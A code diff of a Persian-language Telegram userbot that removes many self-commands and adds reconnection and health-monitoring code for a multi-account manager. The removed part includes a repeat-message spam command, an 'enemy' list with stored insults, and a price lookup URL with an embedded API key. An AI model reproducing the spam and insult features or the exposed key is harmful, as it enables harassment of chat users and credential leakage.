-async def font_list_command(client: Client, message: Message):
-    sample_time = "12:34"
-    fonts_samples = "\n".join([f"**فونت {i}:** {''.join([FONTS[i].get(char, char) for char in sample_time])}" for i in range(1, 7)])
-    await message.edit(f"🔤 **لیست فونت‌های زمان**\n\n{fonts_samples}\n\n**استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
-
-@app.on_message(filters.me & filters.command("تنظیم فونت", prefixes=""))
-async def set_font_command(client: Client, message: Message):
-    if len(message.command) < 2: 
-        return await message.edit("⚠️ **استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
-    
-    try:
-        font_num = int(message.command[1])
-        if 1 <= font_num <= 6:
-            user_fonts["me"] = font_num
-            if user_time_status.get(message.from_user.id, False): 
-                await update_name_with_time(message.from_user.id, client)
-            await message.edit(f"✅ **فونت زمان به شماره {font_num} تغییر کرد**\n\nنمونه: {get_iran_time()}")
-        else: 
-            await message.edit("❌ **شماره فونت باید بین 1 تا 6 باشد**")
-    except ValueError: 
-        await message.reply("❌ **لطفا یک عدد وارد کنید**\nمثال: `تنظیم فونت 2`")
-
-@app.on_message(filters.me & filters.command("قیمت", prefixes=""))
-async def price_command(client: Client, message: Message):
-    try:
-        if len(message.command) < 2:
-            await message.edit_text("❌ **لطفا نام ارز را وارد کنید**\nمثال: `قیمت ton` یا `قیمت بیت‌کوین`")
-            return
-        
-        coin_input = ' '.join(message.command[1:]).strip()
-        loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")        
-        async with aiohttp.ClientSession() as session:
-            async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBot") as response:
-                if response.status == 200:
-                    data = await response.json()                    
-                    if data.get("ok"):
-                        prices = data["result"]
-                        found_coin = None
-                        coin_key = None
-                        if coin_input.upper() in prices:
-                            found_coin = prices[coin_input.upper()]
-                            coin_key = coin_input.upper()
-                        else:
-                            for key, coin_data in prices.items():
-                                if 'name' in coin_data and coin_input.lower() in coin_data['name'].lower():
-                                    found_coin = coin_data
-                                    coin_key = key
-                                    break                        
-                        if found_coin and coin_key:
-                            coin_data = found_coin
-                            price_text = f"""**💰 قیمت {coin_data['name']} ({coin_key})**
-💵 **قیمت تومانی:** `{'{:,}'.format(int(float(coin_data['irr'])))}` تومان
-💰 **قیمت دلاری:** `{float(coin_data['usdt']):,.2f}$`
-📊 **تغییر 24h:** {'🟢' if float(coin_data['dayChange']) > 0 else '🔴'} `{coin_data['dayChange']}%`
-
-⏰ **آپدیت:** {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%H:%M')}
-"""
-                            await loading_msg.edit_text(price_text)
-                        else:
-                            await loading_msg.edit_text(f"❌ **ارز '{coin_input}' یافت نشد**\n\n💡 **مثال‌ها:**\n`قیمت BTC` - `قیمت بیت‌کوین`\n`قیمت ETH` - `قیمت اتریوم`\n`قیمت TON` - `قیمت تون`")
-                    else:
-                        await loading_msg.edit_text("❌ خطا در دریافت اطلاعات از API")
                 else:
-                    await loading_msg.edit_text("❌ خطا در اتصال به سرور")
+                    wait_time = (attempt + 1) * 10
+                    print(f"⏳ انتظار {wait_time} ثانیه قبل از تلاش مجدد...")
+                    await asyncio.sleep(wait_time)
                     
-    except Exception as e:
-        await message.edit_text(f"❌ خطا: {str(e)}")
-
-@app.on_message(filters.me & filters.command("اسپم", prefixes=""))
-async def spam_command(client: Client, message: Message):
-    if len(message.command) < 3:
-        return await message.edit_text("❌ **فرمت صحیح:**\n`اسپم 10 سلام`\n\nعدد = تعداد پیام\nمتن = پیام مورد نظر")
-    
-    try:
-        count = int(message.command[1])
-        if count > 50:
-            return await message.edit_text("❌ **حداکثر تعداد مجاز: 50 پیام**")
-        
-        spam_text = ' '.join(message.command[2:])
-        
-        if not spam_text:
-            return await message.edit_text("❌ **لطفا متن پیام را وارد کنید**")
-        
-        loading_msg = await message.edit_text(f"🔄 **در حال ارسال {count} پیام...**")
-        
-        success_count = 0
-        for i in range(count):
-            try:
-                await client.send_message(
-                    message.chat.id,
-                    f"{spam_text}",
-                    reply_to_message_id=message.reply_to_message_id if message.reply_to_message else None
-                )
-                success_count += 1
-                await asyncio.sleep(0.2)
             except Exception as e:
-                print(f"خطا در ارسال پیام {i+1}: {e}")
+                print(f"❌ خطا در راه‌اندازی (تلاش {attempt + 1}): {e}")
+                await asyncio.sleep(15)
         
-        await loading_msg.edit_text(f"✅ **اسپم کامل شد**\n\n📤 **تعداد ارسال شده:** {success_count}/{count}\n💬 **متن:** {spam_text[:50]}{'...' if len(spam_text) > 50 else ''}")
-        
-    except ValueError:
-        await message.edit_text("❌ **لطفا تعداد را به صورت عدد وارد کنید**\nمثال: `اسپم 10 سلام`")
-    except Exception as e:
-        await message.edit_text(f"❌ **خطا در ارسال اسپم:**\n`{str(e)}`")
+        print(f"❌ راه‌اندازی اکانت {self.phone} پس از {self.max_retries} تلاش ناموفق بود")
+        return False
 
-@app.on_message(filters.me & filters.command("پاسخ", prefixes=""))
-async def auto_reply_command(client: Client, message: Message):
-    if len(message.command) < 2:
-        return await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
-    
-    sub_command = message.command[1]
-    
-    if sub_command == "افزودن":
-        if len(message.command) < 3:
-            return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
-        
+    async def health_monitor(self):
+        """مانیتورینگ سلامت اکانت"""
+        while self.is_running and not self.shutdown_requested:
+            try:
+                await asyncio.sleep(self.health_check_interval)
+                
+                if not self.client.is_connected():
+                    print(f"🔌 اتصال {self.phone} قطع شده، تلاش برای اتصال مجدد...")
+                    await self.recover_connection()
+                
+                if time.time() - self.last_activity > 300:
+                    print(f"🫀 بررسی سلامت اکانت {self.phone}")
+                    await self.perform_health_check()
+                
+            except Exception as e:
+                print(f"⚠️ خطا در مانیتورینگ سلامت {self.phone}: {e}")
+                await asyncio.sleep(60)
+
+    async def perform_health_check(self):
+        """انجام بررسی سلامت"""
         try:
-            parts = ' '.join(message.command[2:]).split('|', 1)
-            if len(parts) != 2:
-                return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
+            me = await asyncio.wait_for(self.client.get_me(), timeout=10)
+            if not me:
+                raise Exception("عدم پاسخ از سرور")
+                
+            print(f"✅ سلامت اکانت {self.phone} تأیید شد")
+            return True
             
-            trigger, reply = parts[0].strip(), parts[1].strip()
-            auto_replies[trigger] = reply
-            await message.edit(f"✅ **پاسخ خودکار افزوده شد**\n\n**متن:** {trigger}\n**پاسخ:** {reply}")
         except Exception as e:
-            await message.edit(f"❌ **خطا در افزودن پاسخ:**\n`{e}`")
-    
-    elif sub_command == "حذف":
-        if len(message.command) < 3:
-            return await message.edit("❌ **لطفا متن پاسخ را وارد کنید**\nمثال: `پاسخ حذف سلام`")
-        
-        trigger = ' '.join(message.command[2:]).strip()
-        if trigger in auto_replies:
-            del auto_replies[trigger]
-            await message.edit(f"✅ **پاسخ خودکار حذف شد**\n\n**متن:** {trigger}")
-        else:
-            await message.edit(f"❌ **پاسخ برای متن '{trigger}' یافت نشد**")
-    
-    elif sub_command == "لیست":
-        if not auto_replies:
-            await message.edit("❌ **هیچ پاسخی تنظیم نشده**")
-        else:
-            replies_list = "\n".join([f"• **{trigger}** → {reply}" for trigger, reply in auto_replies.items()])
-            await message.edit(f"📝 **لیست پاسخ‌های خودکار**\n\n{replies_list}\n\n**تعداد:** {len(auto_replies)}")
-    
-    else:
-        await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
+            print(f"❌ مشکل در سلامت اکانت {self.phone}: {e}")
+            await self.recover_connection()
+            return False
 
-@app.on_message(filters.me & filters.command("دشمن", prefixes=""))
-async def enemy_command(client: Client, message: Message):
-    if not message.reply_to_message:
-        return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کن**")
-    
-    enemy_user = message.reply_to_message.from_user
-    enemy_id = enemy_user.id
-    
-    if is_enemy(enemy_id):
-        await message.edit(f"❌ **این کاربر از قبل دشمن است**\n\n👤 کاربر: {enemy_user.first_name}\n🆔 آیدی: `{enemy_id}`")
-    else:
-        enemies.add(enemy_id)
-        save_enemies(enemies)
-        await message.edit(f"**کاربر مورد نظر به لیست دشمن ها اضافه شد 😈**")
-
-@app.on_message(filters.me & filters.command("فحش", prefixes=""))
-async def insult_command(client: Client, message: Message):
-    if len(message.command) < 2:
-        return await message.edit("""
-⚠️ **سیستم مدیریت فحش‌ها**
-
-📋 **دستورات موجود:**
-• `فحش افزودن [متن]` - افزودن فحش جدید
-• `فحش حذف [متن]` - حذف فحش
-• `لیست فحش` - مشاهده لیست فحش‌ها
-
-📝 **مثال:**
-`فحش افزودن تو احمقی`
-`فحش حذف تو احمقی`
-`لیست فحش`
-""")
-    
-    sub_command = message.command[1]
-    
-    if sub_command == "افزودن":
-        if len(message.command) < 3:
-            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش افزودن تو احمقی`")
-        
-        insult_text = ' '.join(message.command[2:]).strip()
-        insults_list = load_insults()
-        if insult_text not in insults_list:
-            insults_list.append(insult_text)
-            if save_insults(insults_list):
-                await message.edit(f"✅ **فحش افزوده شد**\n\n💢 متن: {insult_text}")
-            else:
-                await message.edit("❌ **خطا در ذخیره فحش**")
-        else:
-            await message.edit(f"❌ **این فحش از قبل وجود دارد**")
-    
-    elif sub_command == "حذف":
-        if len(message.command) < 3:
-            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش حذف تو احمقی`")
-        
-        insult_text = ' '.join(message.command[2:]).strip()
-        insults_list = load_insults()
-        if insult_text in insults_list:
-            insults_list.remove(insult_text)
-            if save_insults(insults_list):
-                await message.edit(f"✅ **فحش حذف شد**\n\n💢 متن: {insult_text}")
-            else:
-                await message.edit("❌ **خطا در حذف فحش**")
-        else:
-            await message.edit(f"❌ **این فحش یافت نشد**")
-    
-    else:
-        await message.edit("⚠️ **استفاده:**\n`فحش افزودن [متن]`\n`فحش حذف [متن]`\n`لیست فحش`")
-
-@app.on_message(filters.me & filters.command("حذف", prefixes=""))
-async def remove_enemy_command(client: Client, message: Message):
-    text = message.text.strip()
-    if text == "حذف دشمن":
-        if not message.reply_to_message:
-            return await message.edit("❌ باید روی پیام دشمن ریپلای کنی")
-
-        user_id = message.reply_to_message.from_user.id
-
-        if user_id in enemies:
-            enemies.remove(user_id)
-            save_enemies(enemies)
-            return await message.edit("✅ کاربر با موفقیت از لیست دشمن حذف شد")
-        else:
-            return await message.edit("⚠️ این کاربر داخل لیست دشمن نیست")
-
-@app.on_message(filters.me & filters.command("لیست دشمن", prefixes=""))
-async def enemy_list_command(client: Client, message: Message):
-    if not enemies:
-        return await message.edit("❌ **لیست دشمنان خالی است**")
-    
-    try:
-        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات دشمنان...**")
-        
-        enemies_list = []
-        
-        for enemy_id in list(enemies):
-            try:
-                user = await client.get_users(enemy_id)
-                first_name = user.first_name or ""
-                last_name = user.last_name or ""
-                username = f"@{user.username}" if user.username else "❌ ندارد"
-                full_name = f"{first_name} {last_name}".strip()
-                
-                enemies_list.append({
-                    'id': enemy_id,
-                    'name': full_name,
-                    'username': username
-                })
-                await asyncio.sleep(0.1)
-                
-            except Exception as e:
-                print(f"❌ خطا در دریافت اطلاعات کاربر {enemy_id}: {e}")
-                enemies_list.append({
-                    'id': enemy_id,
-                    'name': "❌ خطا در دریافت",
-                    'username': "❌ خطا در دریافت"
-                })
-        
-        if not enemies_list:
-            return await loading_msg.edit("❌ **هیچ دشمنی در لیست وجود ندارد**")
-        
-        list_text = f"👿 **لیست دشمنان - تعداد: {len(enemies_list)}**\n\n"
-        
-        for i, enemy in enumerate(enemies_list, 1):
-            list_text += f"{i}. **نام:** {enemy['name']}\n"
-            list_text += f"   **آیدی:** `{enemy['id']}`\n"
-            list_text += f"   **یوزرنیم:** {enemy['username']}\n"
-            list_text += "   " + "─" * 30 + "\n"
-        
-        if len(list_text) > 4000:
-            parts = [list_text[i:i+4000] for i in range(0, len(list_text), 4000)]
-            for part in parts:
-                await client.send_message(message.chat.id, part)
-            await loading_msg.delete()
-        else:
-            await loading_msg.edit(list_text)
-            
-    except Exception as e:
-        await message.edit(f"❌ **خطا در دریافت لیست دشمنان:**\n`{e}`")
-
-@app.on_message(filters.me & filters.command("دشمنان", prefixes=""))
-async def enemies_compact_command(client: Client, message: Message):
-    if not enemies:
-        return await message.edit("❌ **لیست دشمنان خالی است**")
-    
-    try:
-        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات...**")
-        
-        compact_text = f"👿 **لیست دشمنان - تعداد: {len(enemies)}**\n\n"
-        
-        for i, enemy_id in enumerate(list(enemies), 1):
-            try:
-                user = await client.get_users(enemy_id)
-                first_name = user.first_name or ""
-                last_name = user.last_name or ""
-                username = f"@{user.username}" if user.username else "بدون یوزرنیم"
-                full_name = f"{first_name} {last_name}".strip() or "بدون نام"
-                
-                compact_text += f"{i}. **{full_name}** - {username} - `{enemy_id}`\n"
-                
-            except Exception as e:
-                compact_text += f"{i}. ❌ خطا در دریافت - `{enemy_id}`\n"
-        
-        await loading_msg.edit(compact_text)
-        
-    except Exception as e:
-        await message.edit(f"❌ **خطا:**\n`{e}`")
-
-@app.on_message(filters.me & filters.command("پاک کردن دشمنان", prefixes=""))
-async def clear_enemies_command(client: Client, message: Message):
-    if not enemies:
-        return await message.edit("❌ **لیست دشمنان از قبل خالی است**")
-    
-    enemy_count = len(enemies)
-    enemies.clear()
-    save_enemies(enemies)
-    
-    await message.edit(f"✅ **تمام دشمنان پاک شدند**\n\n🗑 **تعداد حذف شده:** {enemy_count} نفر")
-@app.on_message(filters.me & filters.command("ایدی", prefixes="") & filters.regex(r"^ایدی$"))
-async def advanced_id_command(client: Client, message: Message):
-    try:
-        user = message.from_user
-        chat = message.chat
-        
-        premium_status = "<b>فعال</b>" if user.is_premium else "<i>غیرفعال</i>"
-        username_id = f"@{user.username}" if user.username else "<i>ندارد</i>"
-        profile_photos = await client.get_chat_photos_count(user.id)
-        
-        if message.reply_to_message:
-            replied_user = message.reply_to_message.from_user
-            replied_chat = message.chat
-            
-            common_chats = await client.get_common_chats(replied_user.id)
-            
-            user_info = f"""
-<b>• اطلاعات کاربر</b>
-
-<b>آیدی عددی:</b> <code>{replied_user.id}</code>
-<b>یوزرنیم:</b> <code>{username_id}</code>
-<b>نام:</b> {replied_user.first_name or '<i>ندارد</i>'}
-<b>نام خانوادگی:</b> {replied_user.last_name or '<i>ندارد</i>'}
-<b>پریمیوم:</b> {"<b>فعال</b>" if replied_user.is_premium else "<i>غیرفعال</i>"}
-<b>تعداد پروفایل:</b> {await client.get_chat_photos_count(replied_user.id)}
-
-<b>• اطلاعات چت</b>
-<b>آیدی چت:</b> <code>{replied_chat.id}</code>
-<b>عنوان چت:</b> {replied_chat.title or '<i>ندارد</i>'}
-<b>تعداد اعضا:</b> {replied_chat.members_count if hasattr(replied_chat, 'members_count') and replied_chat.members_count else '<i>نامشخص</i>'}
-"""
-            
-            if common_chats:
-                user_info += f"\n<b>• گروه‌های مشترک:</b> {len(common_chats)}\n"
-                user_info += f"<blockquote>"
-                
-                for i, common_chat in enumerate(common_chats, 1):
-                    chat_type = "گروه" if common_chat.type in ["group", "supergroup"] else "کانال" if common_chat.type == "channel" else "شخصی"
-                    username = f"@{common_chat.username}" if common_chat.username else "بدون یوزرنیم"
-                    members = f"{common_chat.members_count} عضو" if hasattr(common_chat, 'members_count') and common_chat.members_count else "نامشخص"
-                    
-                    user_info += f"<b>{i}. {common_chat.title}</b>\n"
-                    user_info += f"<i>نوع:</i> {chat_type}\n"
-                    user_info += f"<i>یوزرنیم:</i> {username}\n"
-                    user_info += f"<i>اعضا:</i> {members}\n"
-                    user_info += f"<i>آیدی:</i> <code>{common_chat.id}</code>"
-                    
-                    if i < len(common_chats):
-                        user_info += f"\n\n"
-                
-                user_info += f"</blockquote>"
-            else:
-                user_info += f"\n<b>• گروه‌های مشترک:</b> <i>هیچ گروه مشترکی یافت نشد</i>"
-            
-            await message.edit_text(user_info, parse_mode=enums.ParseMode.HTML)
-            
-        else:
-            chat_info = f"""
-<b>• اطلاعات کاربر و چت</b>
-
-<b>اطلاعات شما</b>
-<b>آیدی عددی:</b> <code>{user.id}</code>
-<b>یوزرنیم:</b> <code>{username_id}</code>
-<b>نام:</b> {user.first_name or '<i>ندارد</i>'}
-<b>نام خانوادگی:</b> {user.last_name or '<i>ندارد</i>'}
-<b>پریمیوم:</b> {premium_status}
-<b>تعداد پروفایل:</b> {profile_photos}
-
-<b>اطلاعات چت فعلی</b>
-<b>آیدی چت:</b> <code>{chat.id}</code>
-<b>عنوان چت:</b> {chat.title or '<i>ندارد</i>'}
-<b>تعداد اعضا:</b> {chat.members_count if hasattr(chat, 'members_count') and chat.members_count else '<i>نامشخص</i>'}
-"""
-            await message.edit_text(chat_info, parse_mode=enums.ParseMode.HTML)
-            
-    except Exception as e:
-        await message.edit_text(f"<b>خطا در دریافت اطلاعات:</b>\n<code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
-
-@app.on_message(filters.me & filters.command("دانلود", prefixes=""))
-async def download_from_link(client: Client, message: Message):
-    if len(message.command) < 2:
-        await message.edit_text("❌ **فرمت:**\n`دانلود https://t.me/channel/123`")
-        return    
-    link = message.command[1]    
-    try:
-        pattern = r"https://t\.me/(.+)/(\d+)"
-        match = re.match(pattern, link)        
-        if not match:
-            await message.edit_text("❌ **لینک نامعتبر!**\nفرمت صحیح: `https://t.me/channel/123`")
-            return        
-        username = match.group(1)
-        post_id = int(match.group(2))        
-        processing_msg = await message.edit_text("🔍 **در حال دریافت پست...**")
-        post = await client.get_messages(username, post_id)        
-        if not post:
-            await processing_msg.edit_text("❌ **پست یافت نشد**")
-            return        
-        await processing_msg.edit_text("📥 **در حال کپی کردن پست...**")        
+    async def recover_connection(self):
+        """بازیابی اتصال قطع شده"""
         try:
-            await post.copy("me")
-            await processing_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")            
-        except Exception as copy_error:
-            await processing_msg.edit_text("🔄 **روش دوم: در حال ارسال محتوا...**")            
-            try:
-                if post.media:
-                    file_path = await post.download()
-                    if post.audio:
-                        await client.send_audio("me", file_path, caption=post.caption or "")
-                    elif post.video:
-                        await client.send_video("me", file_path, caption=post.caption or "")
-                    elif post.photo:
-                        await client.send_photo("me", file_path, caption=post.caption or "")
-                    elif post.document:
-                        await client.send_document("me", file_path, caption=post.caption or "")
-                    elif post.voice:
-                        await client.send_voice("me", file_path, caption=post.caption or "")
-                    elif post.sticker:
-                        await client.send_sticker("me", file_path)
-                    elif post.animation:
-                        await client.send_animation("me", file_path, caption=post.caption or "")
-                    elif post.video_note:
-                        await client.send_video_note("me", file_path)
-                    else:
-                        await client.send_document("me", file_path, caption=post.caption or "")                    
-                    os.remove(file_path)
-                if post.text:
-                    await client.send_message("me", post.text)                
-                await processing_msg.edit_text("✅ **محتوا با موفقیت ارسال شد**")                
-            except Exception as download_error:
-                await processing_msg.edit_text(f"❌ **خطا:** `{str(download_error)}`")            
-    except Exception as e:
-        await message.edit_text(f"❌ **خطا:** `{str(e)}`")
-@app.on_message(filters.me & filters.command("انلاین", prefixes="") & filters.regex(r"^انلاین (روشن|خاموش)$"))
-async def online_command(client, message):
-    global always_online_enabled
-    
-    action = message.command[1]
-    
-    if action == "روشن":
-        always_online_enabled = True
-        await message.edit("✅ **حالت همیشه آنلاین فعال شد**\n\nاکانت شما همیشه به عنوان انلاین نمایش داده خواهد شد.")
-        asyncio.create_task(keep_online())
-        
-    elif action == "خاموش":
-        always_online_enabled = False
-        await message.edit("✅ **حالت همیشه انلاین غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه روشن$"))
-async def lock_all_on_command(client, message):
-    lock_settings["همه"] = True
-    await message.edit("✅ **قفل همه فعال شد**\n\nتمامی پیام‌ها در پیوی حذف خواهند شد.")
-
-@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه خاموش$"))
-async def lock_all_off_command(client, message):
-    lock_settings["همه"] = False
-    await message.edit("✅ **قفل همه غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا روشن$"))
-async def lock_media_on_command(client, message):
-    lock_settings["مدیا"] = True
-    await message.edit("✅ **قفل مدیا فعال شد**\n\nارسال عکس و ویدیو در پیوی حذف خواهد شد.")
-
-@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا خاموش$"))
-async def lock_media_off_command(client, message):
-    lock_settings["مدیا"] = False
-    await message.edit("✅ **قفل مدیا غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر روشن$"))
-async def lock_sticker_on_command(client, message):
-    lock_settings["استیکر"] = True
-    await message.edit("✅ **قفل استیکر فعال شد**\n\nارسال استیکر و گیف در پیوی حذف خواهد شد.")
-
-@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر خاموش$"))
-async def lock_sticker_off_command(client, message):
-    lock_settings["استیکر"] = False
-    await message.edit("✅ **قفل استیکر غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد روشن$"))
-async def lock_forward_on_command(client, message):
-    lock_settings["فوروارد"] = True
-    await message.edit("✅ **قفل فوروارد فعال شد**\n\nارسال پیام فورواردی در پیوی حذف خواهد شد.")
-
-@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد خاموش$"))
-async def lock_forward_off_command(client, message):
-    lock_settings["فوروارد"] = False
-    await message.edit("✅ **قفل فوروارد غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس روشن$"))
-async def lock_voice_on_command(client, message):
-    lock_settings["ویس"] = True
-    await message.edit("✅ **قفل ویس فعال شد**\n\nارسال ویس در پیوی حذف خواهد شد.")
-
-@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس خاموش$"))
-async def lock_voice_off_command(client, message):
-    lock_settings["ویس"] = False
-    await message.edit("✅ **قفل ویس غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام روشن$"))
-async def lock_text_on_command(client, message):
-    lock_settings["پیام"] = True
-    await message.edit("✅ **قفل پیام فعال شد**\n\nارسال پیام متنی در پیوی حذف خواهد شد.")
-
-@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام خاموش$"))
-async def lock_text_off_command(client, message):
-    lock_settings["پیام"] = False
-    await message.edit("✅ **قفل پیام غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل روشن$"))
-async def lock_file_on_command(client, message):
-    lock_settings["فایل"] = True
-    await message.edit("✅ **قفل فایل فعال شد**\n\nارسال فایل در پیوی حذف خواهد شد.")
-
-@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل خاموش$"))
-async def lock_file_off_command(client, message):
-    lock_settings["فایل"] = False
-    await message.edit("✅ **قفل فایل غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("وضعیت قفل", prefixes="") & filters.regex(r"^وضعیت قفل$"))
-async def lock_status_command(client, message):
-    status_text = "🔒 **وضعیت قفل‌های پیوی**\n\n"
-    
-    for lock_type, status in lock_settings.items():
-        emoji = "🔴" if status else "🟢"
-        persian_status = "قفل" if status else "آزاد"
-        status_text += f"{emoji} **{lock_type}**: {persian_status}\n"
-    
-    status_text += f"\n📊 **تعداد قفل‌های فعال:** {sum(lock_settings.values())} از {len(lock_settings)}"
-    
-    await message.edit(status_text)
-
-@app.on_message(filters.me & filters.command("ریست قفل", prefixes="") & filters.regex(r"^ریست قفل$"))
-async def reset_lock_command(client, message):
-    for key in lock_settings:
-        lock_settings[key] = False
-    
-    await message.edit("✅ **همه قفل‌ها ریست شدند**\n\nهمه دسترسی‌ها آزاد شدند.")
-
-@app.on_message(filters.me & filters.command("راهنمای قفل", prefixes="") & filters.regex(r"^راهنمای قفل$"))
-async def lock_help_command(client, message):
-    help_text = """
-🛡️✨ **مرکز کنترل قفل‌های پیوی**
-
-╭───────◆◇◆───────╮
-      🔒 کنترل حرفه‌ای حریم خصوصی
-╰───────◆◇◆───────╯
-
-📘 **شرح کوتاه:**  
-با این دستورات می‌تونی تمام پیام‌ها، مدیاها و تعاملات داخل پیوی رو مدیریت و محدود کنی.
-
-━━━━━━━━━━━━━━━━━━
-
-🌐 **بخش ۱ — قفل‌های کلی**
-• `همه روشن` ➜ فعال‌سازی کامل قفل‌ها  
-• `همه خاموش` ➜ آزادسازی کامل  
-
-━━━━━━━━━━━━━━━━━━
-
-🎨 **بخش ۲ — مدیا و استیکر**
-• `مدیا روشن` ➜ بستن عکس، ویدیو و مدیا  
-• `مدیا خاموش` ➜ آزادسازی مدیا  
-• `استیکر روشن` ➜ قفل استیکر و گیف  
-• `استیکر خاموش` ➜ آزادسازی استیکر  
-
-━━━━━━━━━━━━━━━━━━
-
-🔁 **بخش ۳ — فوروارد و متن**
-• `فوروارد روشن` ➜ جلوگیری از فوروارد  
-• `فوروارد خاموش` ➜ آزادسازی فوروارد  
-• `پیام روشن` ➜ قفل پیام‌های متنی  
-• `پیام خاموش` ➜ مجاز کردن متن‌ها  
-
-━━━━━━━━━━━━━━━━━━
-
-🎧 **بخش ۴ — صدا و فایل**
-• `ویس روشن` ➜ قفل ویس  
-• `ویس خاموش` ➜ آزادسازی ویس  
-• `فایل روشن` ➜ قفل فایل‌ها  
-• `فایل خاموش` ➜ آزادسازی فایل  
-
-━━━━━━━━━━━━━━━━━━
-
-📊 **بخش ۵ — مدیریت وضعیت**
-• `وضعیت قفل` ➜ نمایش وضعیت فعلی  
-• `ریست قفل` ➜ بازگردانی به حالت اولیه  
-
-━━━━━━━━━━━━━━━━━━
-
-💡 **نمونه استفاده:**  
-`همه روشن`  
-"""
-    await message.edit(help_text)
-
-@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین روشن$"))
-async def enable_anti_login(client, message):
-    global anti_login_enabled
-    anti_login_enabled = True
-    await message.edit("""✅ **انتی لاگین فعال شد**
-
-🛡️ **قابلیت‌ها:**
-• شناسایی پیام‌های کد ورود از 777000
-• استخراج خودکار کدهای ورود  
-• ذخیره کدها در پیام‌های ذخیره شده
-• حذف پیام اصلی برای امنیت
-
-📱 **کدها در Saved Messages ذخیره می‌شوند**""")
-
-@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین خاموش$"))
-async def disable_anti_login(client, message):
-    global anti_login_enabled
-    anti_login_enabled = False
-    await message.edit("✅ **انتی لاگین غیرفعال شد**")
-
-@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین$"))
-async def check_anti_login(client, message):
-    status = "فعال ✅" if anti_login_enabled else "غیرفعال ❌"
-    
-    status_text = f"""🛡️ **وضعیت انتی لاگین:** {status}
-
-{"📱 **سیستم فعال است** - کدهای ورود ذخیره می‌شوند" if anti_login_enabled else "🔓 **سیستم غیرفعال است** - پیام‌ها دست‌نخورده باقی می‌مانند"}"""
-
-    await message.edit(status_text)
-
-@app.on_message(filters.me & filters.command("ریکت", prefixes=""))
-async def set_reaction_command(client, message):
-    if len(message.command) < 2:
-        await message.edit("""✨ **سیستم ریکشن خودکار**
-
-╔══════════ • ✤ • ═══════════╗
-
-🎯 **راهنمای دستورات ریکشن خودکار**
-
-📌 با این قابلیت می‌توانید برای کاربران خاص، ریکشن خودکار تنظیم کنید
-
-╟────────────────────────╢
-
-💫 **دستورات موجود:**
-
-◈ `ریکت [ایموجی]` (ریپلای یا یوزرنیم)
-   📝 ثبت ریکشن جدید برای کاربر
-
-◈ `حذف ریکت` (ریپلای یا یوزرنیم)
-   🗑️ حذف ریکشن کاربر
-
-◈ `لیست ریکت`
-   📋 مشاهده لیست ریکشن‌ها
-
-◈ `پاکسازی ریکت`
-   🧹 پاکسازی کامل لیست
-
-╚═══════════ • ✤ • ══════════╝""")
-        return    
-    reaction_emoji = message.command[1]
-    if message.reply_to_message and message.reply_to_message.from_user:
-        user_id = message.reply_to_message.from_user.id
-        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip()        
-        auto_reactions[str(user_id)] = reaction_emoji
-        save_reactions()        
-        await message.edit(f"""✅ **ریکشن با موفقیت ثبت شد**
-👤 **کاربر:** {user_name}
-🆔 **آیدی:** `{user_id}`
-🎭 **ریکشن:** {reaction_emoji}""")
-    elif len(message.command) > 2:
-        username = message.command[2].lstrip('@')
-        try:
-            user = await client.get_users(username)
-            user_id = user.id
-            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip()           
-            auto_reactions[str(user_id)] = reaction_emoji
-            save_reactions()           
-            await message.edit(f"""✅ **ریکشن با موفقیت ثبت شد**
-👤 **کاربر:** {user_name}
-🆔 **آیدی:** `{user_id}`
-🎭 **ریکشن:** {reaction_emoji}""")
-        except:
-            await message.edit("""❌ **خطا در پیدا کردن کاربر**
-⚠️ لطفاً یکی از روش‌های زیر را امتحان کنید:
-• روی پیام کاربر ریپلای کنید
-• یوزرنیم معتبر وارد کنید""")    
-    else:
-        await message.edit("""❌ **ورودی نادرست**
